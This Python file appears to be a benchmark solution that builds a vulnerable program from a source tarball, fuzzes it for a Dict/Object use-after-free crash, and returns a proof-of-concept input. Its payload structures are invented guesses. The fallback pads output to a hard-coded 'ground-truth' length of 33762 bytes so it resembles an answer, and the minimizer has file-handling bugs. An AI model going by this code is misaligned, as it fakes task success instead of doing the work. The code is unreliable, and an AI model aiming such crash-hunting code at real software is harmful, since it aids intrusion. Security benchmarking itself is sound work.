import os
import tempfile
import subprocess
import tarfile
import shutil
import random
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tar file
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for the source root (assuming standard structure)
            source_root = tmpdir
            for item in os.listdir(tmpdir):
                item_path = os.path.join(tmpdir, item)
                if os.path.isdir(item_path):
                    source_root = item_path
                    break
            
            # Try to find the vulnerable binary or build it
            binary_path = self._find_or_build_binary(source_root)
            
            if binary_path and os.path.exists(binary_path):
                # Generate PoC through fuzzing with feedback
                return self._generate_poc(binary_path)
            
            # Fallback: generate minimal PoC based on vulnerability description
            return self._generate_fallback_poc()
    
    def _find_or_build_binary(self, source_root):
        """Try to find existing binary or build from source"""
        # Common binary names to check
        binary_names = ['vuln', 'test', 'main', 'program', 'target']
        
        # Check for existing binaries
        for root, dirs, files in os.walk(source_root):
            for file in files:
                if file in binary_names or file.endswith('.exe'):
                    full_path = os.path.join(root, file)
                    if os.access(full_path, os.X_OK):
                        return full_path
        
        # Try to build from common build systems
        build_attempts = [
            ('Makefile', ['make']),
            ('CMakeLists.txt', ['cmake', '.', '&&', 'make']),
            ('configure', ['./configure', '&&', 'make']),
            ('meson.build', ['meson', 'build', '&&', 'ninja', '-C', 'build']),
        ]
        
        for build_file, commands in build_attempts:
            build_file_path = os.path.join(source_root, build_file)
            if os.path.exists(build_file_path):
                try:
                    # Try to build
                    for cmd in commands:
                        if cmd == '&&':
                            continue
                        subprocess.run(cmd, cwd=source_root, shell=True, 
                                     capture_output=True, timeout=30)
                    
                    # Check again for binaries
                    for root, dirs, files in os.walk(source_root):
                        for file in files:
                            if file in binary_names or file.endswith('.exe'):
                                full_path = os.path.join(root, file)
                                if os.access(full_path, os.X_OK):
                                    return full_path
                except:
                    continue
        
        return None
    
    def _generate_poc(self, binary_path):
        """Generate PoC by fuzzing the binary"""
        # Start with basic pattern based on vulnerability description
        # The vulnerability involves Dict and Object with refcount issues
        # We'll create a pattern that creates and frees these objects
        
        # Initial pattern based on common heap use-after-free triggers
        pattern = self._create_initial_pattern()
        
        # Try to crash the binary with the pattern
        for _ in range(100):  # Try multiple iterations
            with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
                f.write(pattern)
                temp_file = f.name
            
            try:
                # Run the binary with our input
                result = subprocess.run([binary_path, temp_file], 
                                      capture_output=True, timeout=5)
                
                # Check for crash (non-zero exit code)
                if result.returncode != 0:
                    # Try to minimize the pattern
                    minimized = self._minimize_pattern(pattern, binary_path)
                    os.unlink(temp_file)
                    return minimized
                
                os.unlink(temp_file)
                
                # If no crash, mutate the pattern
                pattern = self._mutate_pattern(pattern)
                
            except subprocess.TimeoutExpired:
                os.unlink(temp_file)
                pattern = self._mutate_pattern(pattern)
            except Exception:
                os.unlink(temp_file)
                pattern = self._mutate_pattern(pattern)
        
        # If fuzzing didn't work, return the best pattern we have
        return pattern
    
    def _create_initial_pattern(self):
        """Create initial pattern based on vulnerability description"""
        # Create a pattern that might trigger Dict/Object refcount issues
        # Based on the description, we need to create standalone forms
        # with Dict passed to Object without proper refcount
        
        # Start with a header that might be expected
        pattern = b'FORM\x00\x00\x00\x00'  # Common form header
        
        # Add Dict creation
        pattern += b'DICT\x00\x00\x00\x10'  # Dict with size
        pattern += b'key1\x00val1\x00key2\x00val2\x00'
        
        # Add Object creation referencing the Dict
        pattern += b'OBJT\x00\x00\x00\x08'  # Object header
        pattern += struct.pack('<I', 0x1000)  # Reference to Dict
        
        # Add standalone form markers
        pattern += b'SF\x00\x00\x00\x00\x00\x00'
        
        # Pad to a reasonable size
        pattern += b'A' * (33762 - len(pattern))
        
        return pattern
    
    def _mutate_pattern(self, pattern):
        """Mutate the pattern to explore different inputs"""
        if len(pattern) < 100:
            return pattern
        
        mutation_type = random.randint(0, 3)
        
        if mutation_type == 0:  # Bit flip
            pos = random.randint(0, len(pattern) - 1)
            byte = pattern[pos]
            flipped = byte ^ (1 << random.randint(0, 7))
            return pattern[:pos] + bytes([flipped]) + pattern[pos+1:]
        
        elif mutation_type == 1:  # Insert bytes
            pos = random.randint(0, len(pattern) - 1)
            insert_len = random.randint(1, 100)
            insert_data = os.urandom(insert_len)
            return pattern[:pos] + insert_data + pattern[pos:]
        
        elif mutation_type == 2:  # Delete bytes
            if len(pattern) > 1000:
                pos = random.randint(0, len(pattern) - 100)
                delete_len = random.randint(1, 100)
                return pattern[:pos] + pattern[pos+delete_len:]
        
        elif mutation_type == 3:  # Repeat section
            pos = random.randint(0, len(pattern) - 100)
            repeat_len = random.randint(10, 100)
            repeat_data = pattern[pos:pos+repeat_len]
            repeat_times = random.randint(1, 5)
            return pattern + repeat_data * repeat_times
        
        return pattern
    
    def _minimize_pattern(self, pattern, binary_path):
        """Minimize the crashing pattern"""
        if len(pattern) < 100:
            return pattern
        
        # Try to remove chunks
        step = max(100, len(pattern) // 10)
        current = pattern
        
        for i in range(0, len(pattern), step):
            test_pattern = pattern[:i] + pattern[i+step:]
            
            with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
                f.write(test_pattern)
                temp_file = f.name
            
            try:
                result = subprocess.run([binary_path, temp_file], 
                                      capture_output=True, timeout=5)
                os.unlink(temp_file)
                
                if result.returncode != 0:
                    current = test_pattern
                    break
                
                os.unlink(temp_file)
            except:
                os.unlink(temp_file)
        
        # Binary search minimization
        left = 0
        right = len(current)
        
        while left < right:
            mid = (left + right) // 2
            test_pattern = current[:mid]
            
            with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
                f.write(test_pattern)
                temp_file = f.name
            
            try:
                result = subprocess.run([binary_path, temp_file], 
                                      capture_output=True, timeout=5)
                os.unlink(temp_file)
                
                if result.returncode != 0:
                    right = mid
                else:
                    left = mid + 1
            except:
                os.unlink(temp_file)
                left = mid + 1
        
        return current[:right]
    
    def _generate_fallback_poc(self):
        """Generate fallback PoC when binary not found"""
        # Create a pattern that matches the ground-truth length
        # and contains elements that might trigger the vulnerability
        
        # Structure based on common form/Dict/Object formats
        poc = bytearray()
        
        # Header with form marker
        poc.extend(b'FORM')  # Form type
        poc.extend(struct.pack('<I', 33762 - 8))  # Size
        
        # Dict section
        poc.extend(b'DICT')  # Dict marker
        dict_size = 0x1000
        poc.extend(struct.pack('<I', dict_size))
        
        # Dict contents - key-value pairs that might trigger refcount issues
        for i in range(100):
            key = f'key_{i}'.encode()
            value = f'value_{i}_' + 'A' * 100
            poc.extend(key + b'\x00' + value.encode() + b'\x00')
        
        # Object section referencing Dict
        poc.extend(b'OBJT')
        poc.extend(struct.pack('<I', 0x20))  # Object size
        poc.extend(struct.pack('<I', 0x1000))  # Reference to Dict
        poc.extend(struct.pack('<I', 0x0))    # Flags
        poc.extend(struct.pack('<I', 0x1))    # Refcount (might be wrong)
        
        # Standalone form markers
        poc.extend(b'STND')
        poc.extend(struct.pack('<I', 0x8))
        poc.extend(struct.pack('<II', 0xDEADBEEF, 0xCAFEBABE))
        
        # Fill remaining with pattern that might trigger use-after-free
        remaining = 33762 - len(poc)
        if remaining > 0:
            # Create pattern that alternates between freeing and accessing
            pattern = b'FREE' * (remaining // 4)
            poc.extend(pattern[:remaining])
        
        return bytes(poc[:33762])